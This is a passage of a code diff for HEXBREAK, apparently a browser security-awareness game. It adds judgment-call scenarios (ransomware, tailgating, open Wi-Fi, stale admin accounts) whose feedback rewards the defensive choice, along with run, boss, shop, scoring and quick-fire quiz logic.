+ ["Pay it and make this stop",r=>{const c=Math.min(100,r.credits);r.credits-=c;if(rnd()<.5){r.breach=Math.max(0,r.breach-10);return[`−${c} credits, breach −10`,"They eased off, for now. Paying funds the next attack and marks you as someone who pays.",0]}r.breach=Math.min(99,r.breach+8);return[`−${c} credits, breach +8`,"They took the money and stayed. A criminal's promise is not a recovery plan; backups are.",0]}],
+ ["Refuse, restore from backups",r=>{r.score+=150;return["+150 score","Tested offline backups turn ransomware from a catastrophe into an inconvenience.",1]}]]},
+{t:"A password over chat",x:"A colleague on leave messages you their password so you can pull a file from their mailbox faster.",o:[
+ ["Use it, it saves an hour",r=>{r.credits+=30;r.breach=Math.min(99,r.breach+10);return["+30 credits, breach +10","Now the password sits in chat history, and the logs say they did whatever you do next. Shared credentials destroy accountability.",0]}],
+ ["Ask their manager for delegated access",r=>{r.score+=100;return["+100 score","Slower, but every action stays tied to the person who took it.",1]}]]},
+{t:"The log disk is almost full",x:"The busiest server is about to run out of space, and logging is what is filling it.",o:[
+ ["Turn logging off on that server",r=>{r.credits+=35;r.breach=Math.min(99,r.breach+10);return["+35 credits, breach +10","You just blinded yourself on the machine the attacker is most likely to touch. No logs, no detection, no evidence.",0]}],
+ ["Pay for storage and rotate the logs",r=>{r.credits=Math.max(0,r.credits-20);r.score+=120;return["−20 credits, +120 score","Rotate, compress and ship logs elsewhere. They are the only witness you have.",1]}]]},
+{t:"An unknown device on the office Wi-Fi",x:"Something called \"printer-3\" joined an hour ago. You do not have a third printer.",o:[
+ ["Leave it, it is probably a printer",r=>{r.breach=Math.min(99,r.breach+12);return["Breach +12","It was a drop box planted in a meeting room. You cannot defend what you have not inventoried.",0]}],
+ ["Move it to a quarantine VLAN and trace it",r=>{r.breach=Math.max(0,r.breach-10);return["Breach −10","Isolate first, investigate second. Network access control exists for exactly this.",1]}]]},
+{t:"Help from a stranger",x:"A researcher you have never heard of emails a script that \"removes this exact malware\".",o:[
+ ["Run it on the infected server right away",r=>{if(rnd()<.5){r.breach=Math.min(99,r.breach+20);return["Breach +20","It was the attacker, offering a second payload. Unverified code from a stranger is just malware with better manners.",0]}r.breach=Math.max(0,r.breach-15);return["Breach −15","It worked, and you had no way of knowing it would. Running unreviewed code as admin is a coin flip.",0]}],
+ ["Verify who they are and read the script first",r=>{r.shields++;return["Honeypot gained","Their indicators checked out, and you turned them into a trap. Trust, but verify the sender and the code.",1]}]]},
+{t:"Someone at the secure door",x:"A person in a hi-vis vest, arms full of boxes, smiles and asks you to hold the server-room door.",o:[
+ ["Hold the door, their hands are full",r=>{r.breach=Math.min(99,r.breach+12);return["Breach +12","That is tailgating, and the boxes are the trick. Politeness is the most reliable exploit there is.",0]}],
+ ["Offer to walk them to reception for a badge",r=>{r.score+=110;return["+110 score","Friendly and firm. A real contractor loses one minute; an intruder loses the building.",1]}]]},
+{t:"An urgent fix from the airport",x:"A hotfix has to go out before you board. The only network is the open \"Airport_Free_WiFi\".",o:[
+ ["Connect and push it straight away",r=>{r.credits+=20;r.breach=Math.min(99,r.breach+10);return["+20 credits, breach +10","Anyone can run a hotspot with that name. On an open network, assume someone is in the middle.",0]}],
+ ["Tether to your phone and use the VPN",r=>{r.score+=100;return["+100 score","Your own connection plus an encrypted tunnel. Slower by thirty seconds, safer by a mile.",1]}]]},
+{t:"A ghost in the directory",x:"You find an active admin account belonging to someone who left the company two years ago.",o:[
+ ["Leave it, disabling it might break something",r=>{r.breach=Math.min(99,r.breach+14);return["Breach +14","It was the account the intruder had been using. Orphaned accounts are unmonitored keys; offboarding must remove them.",0]}],
+ ["Disable it now and watch for what breaks",r=>{r.breach=Math.max(0,r.breach-8);return["Breach −8","If something depended on it, that gets a proper service account. Nothing should run on a former employee's login.",1]}]]},
+{t:"The vendor wants the firewall open",x:"\"Just allow any-to-any for an hour so we can troubleshoot. We will tell you when to close it.\"",o:[
+ ["Open it, it is only temporary",r=>{if(rnd()<.65){r.breach=Math.min(99,r.breach+16);return["Breach +16","Nobody ever called back, and the rule stayed. Temporary any-any rules are how permanent holes are made.",0]}return["Nothing happened, this time","You remembered to close it. Most people do not, which is why this request should never be granted as asked.",0]}],
+ ["Allow one port from their address, expiring tonight",r=>{r.score+=110;return["+110 score","The narrowest rule that solves the problem, with an end date. Least privilege applies to firewalls too.",1]}]]}];
+function maybeEvent(cb){const pool=EVENTS.filter(e=>!run.evt[e.t]);if(run.evt['s'+run.sector]||run.step<1||run.step>3||!pool.length||rnd()>.4)return cb();
+  run.evt['s'+run.sector]=1;const ev=pick(pool);run.evt[ev.t]=1;const os=shuffle(ev.o);
+  show(`<section class="stack" style="padding:16px 0"><span class="gtag" style="color:var(--violet)">Judgment call</span><h2>${ev.t}</h2><p style="max-width:60ch">${ev.x}</p><div class="stack" id="eo">${os.map((o,i)=>`<button class="btn" style="text-align:left" data-i="${i}"><span class="mono" style="color:var(--dim)">${i+1}</span>&nbsp; ${o[0]}</button>`).join('')}</div><div id="fb"></div></section>`);
+  const choose=once(i=>{const[eff,why,good]=os[i][1](run);if(good){run.evt.good=(run.evt.good||0)+1;if(run.evt.good>=3)award('wise')}hud();saveRun(0);good?sfx.ok():sfx.bad();$$('#eo .btn').forEach((b,j)=>{b.disabled=true;if(j===i)b.style.borderColor='var(--amber)'});
+    const go=once(cb);$('#fb').innerHTML=`<div class="verdict ${good?'ok':'bad'}"><div><b>${eff}.</b> ${why}</div><button class="btn sm" id="vnext">Continue<kbd>↵</kbd></button></div>`;$('#vnext').onclick=go;keyFn=e=>{if(e.key==='Enter'||e.key===' '){go();return true}}});
+  $$('#eo .btn').forEach(b=>b.onclick=()=>choose(+b.dataset.i));keyFn=e=>{const i=+e.key-1;if(i>=0&&i<os.length){choose(i);return true}}}
+
+function pathHTML(){let h='<div class="path">';for(let i=0;i<4;i++)h+=`<i class="${i<run.step?'done':i===run.step?'cur':''}"></i>`;return h+`<i class="boss ${run.step>=4?'cur':''}"></i></div>`}
+function mapScreen(){hud();saveRun(0);if(run.step>=4)return bossIntro();const d=diff();
+  const ids=shuffle(Object.keys(G).filter(x=>x!==run.last));const ch=[{type:'game',id:ids[0],hard:false},{type:'game',id:ids[1],hard:rnd()<.45}];
+  const r=rnd();ch.push(r<.2&&run.breach>=15?{type:'safe'}:r<.4?{type:'cache'}:{type:'game',id:ids[2],hard:true});
+  show(`<section class="stack"><div class="row" style="justify-content:space-between"><div><span class="gtag">Sector ${run.sector+1} · ${sectName(run.sector)}</span><h2>Choose your next node</h2></div>${pathHTML()}</div>
+   <div class="cards">${ch.map((c,i)=>{if(c.type==='safe')return `<button class="card special" data-i="${i}"><span class="glyph">+</span><h3>Containment window</h3><p>Use the quiet moment to isolate infected hosts. Breach −20.</p><div class="meta"><span>no risk</span><span>[${i+1}]</span></div></button>`;
+     if(c.type==='cache')return `<button class="card special" data-i="${i}"><span class="glyph">$</span><h3>Tool cache</h3><p>Pick one free upgrade from two.</p><div class="meta"><span>no risk</span><span>[${i+1}]</span></div></button>`;
+     const g=G[c.id],dd=d+(c.hard?2:0);return `<button class="card ${c.hard?'hard':''}" data-i="${i}"><span class="glyph">${g.glyph}</span><h3>${g.name}</h3><p>${g.tag}${c.hard?' <span class="chip red">hardened ×1.5</span>':''}</p><div class="pips">${pips(dd)}</div><div class="meta"><span>+${Math.round((18+dd*3)*(c.hard?1.5:1)*run.mods.credit)} cr</span><span>[${i+1}]</span></div></button>`}).join('')}</div>
+   <div class="row"><span class="lab">Operator</span><span class="chip">${run.cls.n}</span>${run.mut?`<span class="chip red">${run.mut}</span>`:''}${run.perks.map(p=>`<span class="chip amber">${p}</span>`).join('')}${run.shields?`<span class="chip green">honeypot ×${run.shields}</span>`:''}</div></section>`);
+  const choose=once(i=>{const c=ch[i];sfx.click();
+    if(c.type==='safe'){run.breach=Math.max(0,run.breach-20);toast('Hosts isolated. <b>Breach −20</b>');run.step++;return mapScreen()}
+    if(c.type==='cache')return cacheScreen();
+    const dd=d+(c.hard?2:0);run.last=c.id;saveRun(1);playGame(c.id,dd,{},res=>{const out=settle(res,{d:dd,hard:c.hard});resultScreen(c.id,res,out,()=>{run.step++;saveRun(0);maybeEvent(mapScreen)})})});
+  $$('.card').forEach(b=>b.onclick=()=>choose(+b.dataset.i));keyFn=e=>{if(e.key>='1'&&e.key<='3'){choose(+e.key-1);return true}}}
+
+const TOUCH=matchMedia('(hover:none) and (pointer:coarse)').matches,TK={phish:'Tap the giveaway to report it, or tap Looks legit',fw:'Tap Allow or Deny · at higher difficulty, tap the deciding rule',dec:'Tap the tools · Undo steps back',logs:'Tap the attack, then name it',bits:'Tap a bit to flip it',lock:'Tap the symbols, then Enter',quar:'Tap a host · the red bar shows time until the next spread',pw:'Tap them in order',bis:'Tap a commit to test it',knock:'Tap the pads',quiz:'Tap an answer'};
+function tx(t){return TOUCH?t.replace(/\bClick\b/g,'Tap').replace(/\bclicks\b/g,'taps').replace(/\bclick\b/g,'tap'):t}
+function playGame(id,d,opt,cb){const g=G[id];show(`<section class="brief"><span class="gtag">${opt.label||g.tag}</span><h2><span class="glyph">${g.glyph}</span>${g.name}</h2><p>${tx(g.how)}</p><p class="keys">${TOUCH&&TK[id]||g.keys}</p>${S.g[id]&&S.g[id].p?`<p class="keys">Your record: ${S.g[id].w} of ${S.g[id].p} won &nbsp;${starsHTML(id)}</p>`:''}<div class="pips">${pips(d)}</div><div><button class="btn primary" id="go">Start<kbd>↵</kbd></button></div></section>`);
+  const go=once(()=>{sfx.click();g.play(d,once(cb))});$('#go').onclick=go;keyFn=e=>{if(e.key==='Enter'||e.key===' '){go();return true}}}
+
+const stars=id=>{const g=S.g[id];return!g?0:g.f>=8?3:g.w>=8?2:g.w>=2?1:0};
+const starsHTML=id=>{const n=stars(id);return `<span class="stars">${'★'.repeat(n)}<s>${'★'.repeat(3-n)}</s></span>`};
+function stat(id,res){const g=S.g[id]||(S.g[id]={p:0,w:0,f:0});g.p++;if(res.win)g.w++;if(res.perfect)g.f++;persist();if(stars(id)>=3)award('master');if(Object.keys(G).every(k=>S.g[k]&&S.g[k].w))award('poly')}
+function settle(res,o){const out={lines:[],total:0,cr:0,br:0},noise=o.boss&&run.boss&&run.boss.noise||1;run.played++;stat(res.game,res);
+  if(res.win){run.combo++;run.maxCombo=Math.max(run.maxCombo,run.combo);run.cleared++;
+    const base=Math.round((100+o.d*20)*(o.hard?1.5:1)*(o.boss?1.5:1)),speed=Math.round(base*.5*res.frac*run.mods.speed*(o.boss&&run.boss&&run.boss.nospeed?0:1)),perf=res.perfect?Math.round(base*.25*run.mods.perf):0,cm=mult(run.combo);
+    out.total=Math.round((base+speed+perf)*cm*run.mods.score);out.lines=[['Node value',base],['Speed bonus',speed]];if(perf)out.lines.push(['Flawless',perf]);
+    if(cm>1)out.lines.push([`Combo ×${cm.toFixed(2)}`,'']);if(run.mods.score!==1)out.lines.push([`Score modifier ×${run.mods.score.toFixed(1)}`,'']);
+    run.score+=out.total;out.cr=Math.round((18+o.d*3)*(o.hard?1.5:1)*(o.boss?1.3:1)*run.mods.credit);if(run.interest)out.cr+=Math.min(20,Math.round(run.credits*.1));run.credits+=out.cr;out.br=Math.round(res.mistakes*3*run.mods.trace*noise);
+    award('first');if(run.combo>=5)award('c5');if(run.combo>=10)award('c10');if(res.game==='phish'&&res.perfect)award('phish')}
+  else{run.lostBy[res.game]=(run.lostBy[res.game]||0)+1;if(run.guard>0){run.guard--;out.guarded=true}else run.combo=0;let b=Math.round((22+(o.hard?6:0)+(o.boss?-4:0))*run.mods.trace*noise);if(run.shields>0){run.shields--;b=0;out.shield=true}out.br=b;if(run.ins){out.ins=30*run.ins;run.credits+=out.ins}}
+  run.breach=Math.min(100,run.breach+out.br);if(run.breach>=100&&run.kill>0){run.kill--;run.breach=70;out.kill=true}
+  if(run.score>=3000)award('s3');if(run.score>=8000)award('s8');return out}
+
+function learnHTML(res){const fresh=learn(res.learn);let keys=fresh.slice(0,3),cls='new',head='Added to your codex';
+  if(!keys.length&&res.learn&&res.learn.length){keys=[res.learn[Math.floor(Math.random()*res.learn.length)]];cls='';head='Remember'}
+  return keys.length?`<div class="learn"><span class="lab">${head}</span>${keys.map(k=>entryHTML(k,cls)).join('')}</div>`:''}
+function resultScreen(id,res,out,next){hud();const dead=run.breach>=100;if(res.win){sfx.win();burst();if(out.total)floatText('+'+out.total)}else{sfx.lose();hurt()}
+  show(`<section class="result ${res.win?'win':'lose'}"><span class="gtag">${G[id].name}</span><h2>${res.win?(res.perfect?'Flawless.':'Node secured.'):'Node lost.'}</h2>${res.note?`<p class="mono">${esc(res.note)}</p>`:''}
+   <div class="tally">${out.lines.map(l=>`<span>${l[0]}</span><span>${l[1]}</span>`).join('')}${res.win?`<span class="tot">Score</span><span class="tot">+${out.total.toLocaleString()}</span><span>Credits</span><span>+${out.cr}</span>`:''}
+   <span>Breach</span><span style="color:${out.br?'var(--red)':'var(--green)'}">${out.br?'+'+out.br:'no change'}</span></div>
+   ${out.shield?'<p class="chip green">Honeypot absorbed the breach</p>':''}${out.guarded?'<p class="chip amber">Capacitor held your combo</p>':''}${out.kill?'<p class="chip amber">Offline backups restored you to 70%</p>':''}${out.ins?`<p class="chip green">Insurance paid ${out.ins} credits</p>`:''}
+   ${!res.win&&!out.guarded?'<p class="mono" style="color:var(--dim)">Combo reset.</p>':''}${learnHTML(res)}
+   <div><button class="btn primary" id="go">${dead?'See the damage':'Continue'}<kbd>↵</kbd></button></div></section>`);
+  const go=once(()=>dead?gameOver(false):next());$('#go').onclick=go;keyFn=e=>{if(e.key==='Enter'||e.key===' '){go();return true}}}
+
+function pickPerks(n){return shuffle(PERKS.filter(p=>!(p.id==='patch'&&run.breach<20)&&!(p.id==='int'&&run.interest))).slice(0,n)}
+function applyPerk(p){p.f(run);if(p.id!=='patch'&&p.id!=='hp')run.perks.push(p.n);sfx.ok();hud()}
+function cacheScreen(){const ps=pickPerks(2);show(`<section class="stack"><div><span class="gtag">Tool cache</span><h2>Take one</h2></div><div class="shop" style="grid-template-columns:repeat(2,minmax(0,1fr))">${ps.map((p,i)=>`<div class="perk"><h3>${p.n}</h3><p>${p.x}</p><button class="btn primary sm" data-i="${i}">Take</button></div>`).join('')}</div></section>`);
+  const take=once(i=>{applyPerk(ps[i]);run.step++;mapScreen()});$$('.perk .btn').forEach(b=>b.onclick=()=>take(+b.dataset.i))}
+
+function bossIntro(){hud();const b=BOSSES[run.sector%BOSSES.length];sfx.lose();
+  show(`<section class="stack" style="padding:20px 0"><span class="gtag" style="color:var(--red)">Sector ${run.sector+1} threat · ${b.t}</span><div class="bossname">${b.n}</div><p style="max-width:56ch">${b.x}</p><p class="chip red" style="align-self:flex-start">${b.rule}</p><p class="keys">${b.ph} phases back to back. Win at least ${b.need} to contain it. Boss nodes score ×1.5.</p><div><button class="btn primary" id="go">Engage<kbd>↵</kbd></button></div></section>`);
+  const ids=shuffle(Object.keys(G)).slice(0,b.ph);const go=once(()=>{run.boss=b;saveRun(2);bossPhase(0,ids,0)});$('#go').onclick=go;keyFn=e=>{if(e.key==='Enter'||e.key===' '){go();return true}}}
+function bossPhase(i,ids,wins){const b=run.boss;if(i>=b.ph)return bossEnd(wins);const d=diff()+.5;
+  playGame(ids[i],d,{label:`${b.n} · phase ${i+1} of ${b.ph}`},res=>{const out=settle(res,{d,boss:true});resultScreen(ids[i],res,out,()=>bossPhase(i+1,ids,wins+(res.win?1:0)))})}
+function bossEnd(wins){const b=run.boss,ok=wins>=b.need;run.boss=null;let msg;
+  if(ok){run.credits+=60;run.breach=Math.max(0,run.breach-15);run.score+=300;award('boss');if(run.sector>=3)award('ot');msg='+300 score · +60 credits · breach −15';sfx.win();burst()}
+  else{run.breach=Math.min(100,run.breach+15);if(run.breach>=100&&run.kill>0){run.kill--;run.breach=70}msg='It slipped deeper into the network. Breach +15';sfx.lose();hurt()}
+  hud();const dead=run.breach>=100;
+  show(`<section class="result ${ok?'win':'lose'}"><span class="gtag">${b.n} · ${wins} of ${b.ph} phases won</span><h2>${ok?'Threat contained.':'Threat escaped.'}</h2><p class="mono">${msg}</p><div><button class="btn primary" id="go">${dead?'See the damage':'Resupply'}<kbd>↵</kbd></button></div></section>`);
+  const go=once(()=>dead?gameOver(false):shop());$('#go').onclick=go;keyFn=e=>{if(e.key==='Enter'||e.key===' '){go();return true}}}
+
+function shop(){let ps=pickPerks(3),bought={};const justWon=run.sector===2&&!run.won;if(justWon){run.won=true;run.score+=500;S.wins++;persist();award('win');if(run.breach<25)award('ghost')}
+  function draw(){hud();saveRun(3);show(`<section class="stack"><div><span class="gtag">${justWon?'Contract fulfilled · +500 score':'Between sectors'}</span><h2>${justWon?'All three sectors are clean.':'Resupply'}</h2>${run.won?`<p style="max-width:60ch">${justWon?'You can cash out now for a 25% score bonus, or stay on for overtime. Overtime gets harder every sector and a breach there costs you the bonus.':'Cash out for a 25% bonus, or push deeper.'}</p>`:''}</div>
+    <div class="shop">${ps.map((p,i)=>`<div class="perk"><h3>${p.n}</h3><p>${p.x}</p><button class="btn sm ${bought[i]?'':'primary'}" data-i="${i}" ${bought[i]||run.credits<p.c?'disabled':''}>${bought[i]?'Installed':`Buy · ${p.c} cr`}</button></div>`).join('')}</div>
+    <div class="row"><button class="btn sm" id="rr" ${run.credits<15?'disabled':''}>Reroll · 15 cr</button><span class="mono" style="color:var(--dim)">${run.credits} credits</span></div>
+    <div class="row">${run.won?`<button class="btn ok" id="cash">Cash out +25%</button>`:''}<button class="btn primary" id="go">${run.won?'Overtime: '+sectName(run.sector+1):'Enter sector '+(run.sector+2)+': '+sectName(run.sector+1)}<kbd>↵</kbd></button></div></section>`);
+    $$('.perk .btn').forEach(b=>b.onclick=()=>{const i=+b.dataset.i,p=ps[i];if(run.credits<p.c)return;run.credits-=p.c;bought[i]=1;applyPerk(p);draw()});
+    $('#rr').onclick=()=>{run.credits-=15;ps=pickPerks(3);bought={};sfx.click();draw()};
+    const go=once(()=>{run.sector++;run.step=0;run.last=null;mapScreen()});$('#go').onclick=go;if($('#cash'))$('#cash').onclick=once(()=>gameOver(true));
+    keyFn=e=>{if(e.key==='Enter'){go();return true}}}
+  draw()}
+
+function gameOver(cashed){const r=run;clearScreen();dropRun();let bonus=0;if(cashed){bonus=Math.round(r.score*.25);r.score+=bonus}
+  const xp=Math.round(r.score/10),before=rankOf(S.xp);S.xp+=xp;const after=rankOf(S.xp);const newBest=r.score>S.best;if(newBest)S.best=r.score;
+  let dailyBest=false;if(r.daily){const k=today();if(!(S.daily[k]>=r.score)){S.daily={[k]:r.score};dailyBest=true}award('daily')}
+  const worst=Object.keys(r.lostBy).sort((a,b)=>r.lostBy[b]-r.lostBy[a])[0];
+  persist();postScore(r);run=null;hud();if(cashed||r.won){sfx.win();burst()}else sfx.lose();
+  show(`<section class="result ${cashed?'win':'lose'}"><span class="gtag">${r.daily?'Daily run · '+today():'Run complete'}</span><h2>${cashed?'Clean exit.':r.breach>=100?'Network breached.':'Run ended.'}</h2>
+   <p style="max-width:58ch">${cashed?'You walked away with the network intact.':r.breach>=100?(r.won?'The contract was already fulfilled, but overtime got you.':`The intruder got through in sector ${r.sector+1}, ${sectName(r.sector)}.`):''}</p>
+   <div class="tally">${bonus?`<span>Cash-out bonus</span><span>+${bonus.toLocaleString()}</span>`:''}<span class="tot">Final score</span><span class="tot" id="fs">0</span><span>Nodes secured</span><span>${r.cleared} / ${r.played}</span><span>Best combo</span><span>${r.maxCombo}</span><span>Operator</span><span>${r.cls.n}</span><span>XP earned</span><span>+${xp}</span></div>
+   ${newBest&&r.score>0?'<p class="chip amber">New personal best</p>':''}${dailyBest&&!newBest?'<p class="chip amber">Best daily score today</p>':''}${after>before?`<p class="chip green">Promoted to ${RANKS[after][1]}</p>`:''}
+   ${worst?`<p class="hint">Most of your breach came from <b>${G[worst].name}</b>. A few practice rounds there will pay off next run.</p>`:''}
+   ${rankHTML()}<div class="row"><button class="btn primary" id="again">${r.daily?'Retry daily':'Run it back'}<kbd>↵</kbd></button>${worst?'<button class="btn" id="drill">Drill '+G[worst].name+'</button>':''}<button class="btn" id="share">Copy result</button><button class="btn" id="home">Home</button></div></section>`);
+  const el=$('#fs'),t0=performance.now();const iv=setInterval(()=>{const f=Math.min(1,(performance.now()-t0)/700);el.textContent=Math.round(r.score*f).toLocaleString();if(f>=1)clearInterval(iv)},30);
+  const again=once(()=>newRun(r.daily,r.cls));
+  $('#share').onclick=()=>{const txt=`HEXBREAK${r.daily?' daily '+today():''}: ${r.score.toLocaleString()} points, ${r.cleared} nodes secured, best combo ${r.maxCombo}, playing ${r.cls.n}`;try{navigator.clipboard.writeText(txt).then(()=>toast('Result copied'),()=>toast(esc(txt)))}catch(e){toast(esc(txt))}};if($('#drill'))$('#drill').onclick=()=>{_r=Math.random;pracPlay(worst,3)};$('#again').onclick=again;$('#home').onclick=home;keyFn=e=>{if(e.key==='Enter'){again();return true}}}
+
+/* =====================================================================
+   HOME / PRACTICE / CODEX
+   ===================================================================== */
+function rankHTML(){const i=rankOf(S.xp),nx=RANKS[i+1],lo=RANKS[i][0];const f=nx?(S.xp-lo)/(nx[0]-lo):1;
+  return `<div class="panel rank"><div><span class="lab">Rank ${i+1} of ${RANKS.length}</span><div class="name">${RANKS[i][1]}</div></div><span class="mono" style="color:var(--dim)">${nx?`${S.xp.toLocaleString()} / ${nx[0].toLocaleString()} XP`:`${S.xp.toLocaleString()} XP`}</span><div class="xp"><i style="width:${Math.round(f*100)}%"></i></div></div>`}
+function home(){run=null;hud();const sv=loadRun(),cx=Object.keys(S.codex).length,ct=Object.keys(CODEX).length,ac=Object.keys(S.ach).length,at=Object.keys(ACH).length,db=S.daily[today()];
+  show(`<section class="stack"><div class="hero"><h1>HEX<span>BREAK</span></h1><p class="tag">02:14. You are on call. Something is already inside the network</p></div>
+   ${S.runs===0?'<div class="panel"><span class="lab">How it works</span><p style="margin-top:6px;max-width:66ch">Each node is a short security challenge. Win to score, and chain wins for a combo multiplier. Mistakes raise the breach meter; at 100% the run is over. Spend credits on upgrades between sectors. Everything you get wrong is explained, and each concept you meet is saved to your codex.</p></div>':''}
+   ${rankHTML()}${(()=>{const nx=CLASSES.find(c=>c.rank>rankOf(S.xp));return nx?`<p class="hint">Next unlock: the <b>${nx.n}</b> operator at rank ${RANKS[nx.rank][1]}.</p>`:''})()}
+   <div class="menu">${sv?`<button class="btn primary wide" id="mRes">Resume run<small>Sector ${sv.run.sector+1} · ${sv.run.score.toLocaleString()} points · breach ${Math.round(sv.run.breach)}%${sv.pending?' · leaving mid-challenge cost you some breach':''}</small></button>`:''}<button class="btn ${sv?'':'primary'} wide" id="mRun">Start a run<small>Three sectors, three bosses, eleven kinds of challenge. Every mistake pushes the breach meter toward 100%.</small></button>
+    <button class="btn" id="mDaily">Daily run<small>Today's twist: ${dailyMut().n}. ${dailyMut().x}${db!=null?` Your best: ${db.toLocaleString()}`:''}${S.streak>1&&S.lastDaily===today()?` · ${S.streak}-day streak`:''}</small></button>
+    <button class="btn wide" id="mBlitz">Blitz<small>Thirty seconds on the clock. Right answers buy time, wrong ones burn it.${S.blitz?' Best: '+S.blitz.toLocaleString():''}</small></button>
+    <button class="btn" id="mPrac">Practice<small>Any minigame, any difficulty, no pressure</small></button>
+    <button class="btn" id="mCodex">Codex<small>${cx} of ${ct} concepts collected</small></button>
+    <button class="btn" id="mAch">Achievements<small>${ac} of ${at} earned</small></button>
+    <button class="btn" id="mLb">Leaderboard<small>All-time and daily scores from everyone with access</small></button>
+    <button class="btn" id="mRec">Records<small>Win rates and mastery stars for every challenge</small></button></div>
+   <div class="panel stats"><div><span class="lab">Best score</span><b>${S.best.toLocaleString()}</b></div><div><span class="lab">Runs</span><b>${S.runs}</b></div><div><span class="lab">Contracts won</span><b>${S.wins}</b></div><div><span class="lab">Sound · Music</span><div class="row" style="gap:6px"><button class="btn sm ghost" id="mute">${S.mute?'Off':'On'}</button><button class="btn sm ghost" id="mus">${S.music?'On':'Off'}</button></div></div></div></section>`);
+  if(!window.claude){$('#mLb').remove();$('#mRec').classList.add('wide')}
+  $('#mRun').onclick=loadout;if($('#mRes'))$('#mRes').onclick=resumeRun;$('#mDaily').onclick=()=>newRun(true);$('#mPrac').onclick=()=>practice(3);$('#mBlitz').onclick=blitz;$('#mCodex').onclick=codex;$('#mAch').onclick=achs;if($('#mLb'))$('#mLb').onclick=()=>board('best');$('#mRec').onclick=records;
+  $('#mute').onclick=()=>{S.mute=!S.mute;persist();$('#mute').textContent=S.mute?'Off':'On';sfx.click()};$('#mus').onclick=()=>{S.music=!S.music;persist();$('#mus').textContent=S.music?'On':'Off'};
+  keyFn=e=>{if(e.key==='Enter'){sv?resumeRun():loadout();return true}}}
+const backBtn='<div><button class="btn sm ghost" id="back">← Home</button></div>';
+/* ---------- Blitz: survival quick-fire. Right answers buy time, wrong ones burn it. ---------- */
+function blitzQ(n){const r=Math.random(),lvl=n<6?1:n<16?2:3;
+  if(r<.4){const q=pick(QS.filter(q=>q[0]<=lvl&&q[0]>=lvl-1));return{q:q[1],a:q[2],o:shuffle(q.slice(2,6))}}
+  if(r<.55){const sv=pick(SV),oth=shuffle(SV.filter(x=>x!==sv)).slice(0,3);return rnd()<.5?{q:`Which service uses port ${sv.p}?`,a:sv.n,o:shuffle([sv,...oth]).map(x=>x.n)}:{q:`Which port does ${sv.n} use?`,a:''+sv.p,o:shuffle([sv,...oth]).map(x=>''+x.p)}}
+  if(r<.75){const bits=lvl===1?4:lvl===2?6:8,v=ri(2,2**bits-1),hex=lvl>1&&rnd()<.4,opts=new Set([v]);while(opts.size<4){const w=v+pick([-16,-8,-4,-2,-1,1,2,4,8,16]);if(w>0)opts.add(w)}
+    return{q:hex?`0x${v.toString(16).toUpperCase()} in decimal?`:`${v.toString(2).padStart(bits,'0')} in decimal?`,a:''+v,o:shuffle([...opts]).map(String)}}
+  if(r<.88){const o=pick(ORGS),set=new Set([o.d]);while(set.size<4)set.add(typo(o.d));return{q:`Which is the real ${o.n} domain?`,a:o.d,o:shuffle([...set])}}
+  const a=ri(1,15),b=ri(1,15),op=pick(['AND','OR','XOR']),v=op==='AND'?a&b:op==='OR'?a|b:a^b,opts=new Set([v]);while(opts.size<4)opts.add(ri(0,15));return{q:`${a} ${op} ${b} = ?`,a:''+v,o:shuffle([...opts]).map(String)}}
+async function postBlitz(v){if(!DB||!UID||!v)return;try{const ref=DB.doc('scores/'+UID),snap=await ref.get(),o=snap.exists?snap.data()||{}:{};if((+o.blitz||0)>=v)return;
+  await ref.set({best:+o.best||0,daily:+o.daily||0,dailyDate:o.dailyDate||'',rank:rankOf(S.xp),runs:+o.runs||0,blitz:v})}catch(e){}}
+function blitz(){_r=Math.random;run=null;hud();sfx.click();let n=0,score=0,streak=0,top=0,q,busy=false;const body=frame({name:'Blitz',tag:'Survival mode'});
+  const finish=once(()=>{const xp=Math.round(score/5),nb=score>S.blitz;if(nb)S.blitz=score;S.xp+=xp;persist();postBlitz(score);if(n>=25)award('reflex');if(n>=50)award('reflex2');nb&&score?(sfx.win(),burst()):sfx.lose();
+    show(`<section class="result ${nb&&score?'win':'lose'}"><span class="gtag">Blitz</span><h2>${nb&&score?'New best.':'Time.'}</h2><div class="tally"><span class="tot">Score</span><span class="tot">${score.toLocaleString()}</span><span>Answered</span><span>${n}</span><span>Longest streak</span><span>${top}</span><span>Personal best</span><span>${S.blitz.toLocaleString()}</span><span>XP earned</span><span>+${xp}</span></div>
+     <div class="row"><button class="btn primary" id="again">Again<kbd>↵</kbd></button><button class="btn" id="home">Home</button></div></section>`);
+    $('#again').onclick=blitz;$('#home').onclick=home;keyFn=e=>{if(e.key==='Enter'){blitz();return true}}});
+  const t=startTimer(30,finish);
+  function render(){busy=false;q=blitzQ(n);$('#gprog').textContent=`Score ${score} · streak ${streak}`;
+    body.innerHTML=`<p class="q">${esc(q.q)}</p><div class="opts">${q.o.map((o,j)=>`<button class="btn" data-j="${j}"><span class="mono" style="color:var(--dim)">${j+1}</span>&nbsp; ${esc(o)}</button>`).join('')}</div><p class="hint">Right answers add time and build a streak bonus. A wrong answer burns four seconds.</p>`;
+    $$('.opts .btn').forEach(b=>b.onclick=()=>ans(+b.dataset.j))}
+  function ans(j){if(busy||t.done)return;busy=true;const ok=q.o[j]===q.a;$$('.opts .btn').forEach((b,k)=>{b.disabled=true;if(q.o[k]===q.a)b.classList.add('right');else if(k===j)b.classList.add('wrongp')});
+    if(ok){streak++;top=Math.max(top,streak);n++;score+=10+Math.min(20,streak*2);t.left=Math.min(t.tot,t.left+Math.max(.8,2.3-n*.04));sfx.ok();later(render,150)}
+    else{streak=0;sfx.bad();hurt();t.hit(4);later(render,800)}}
+  keyFn=e=>{if(e.key>='1'&&e.key<='4'){ans(+e.key-1);return true}};render()}
+function loadout(){const rk=rankOf(S.xp);sfx.click();
+  show(`<section class="stack">${backBtn}<div><span class="gtag">New run</span><h2>Choose your operator</h2></div><div class="cards">${CLASSES.map((c,i)=>{const ok=rk>=c.rank;return `<button class="card" data-i="${i}" ${ok?'':'disabled'}><h3>${c.n}</h3><p>${c.x}</p><div class="meta"><span>${ok?(S.cls===c.id?'last used':''):'Unlocks at rank '+RANKS[c.rank][1]}</span><span>${ok?'['+(i+1)+']':''}</span></div></button>`}).join('')}</div><p class="hint">New operators unlock as you rank up. Enter picks the one you used last.</p></section>`);
+  $('#back').onclick=home;const go=once(i=>newRun(false,CLASSES[i]));$$('.card:not([disabled])').forEach(b=>b.onclick=()=>go(+b.dataset.i));
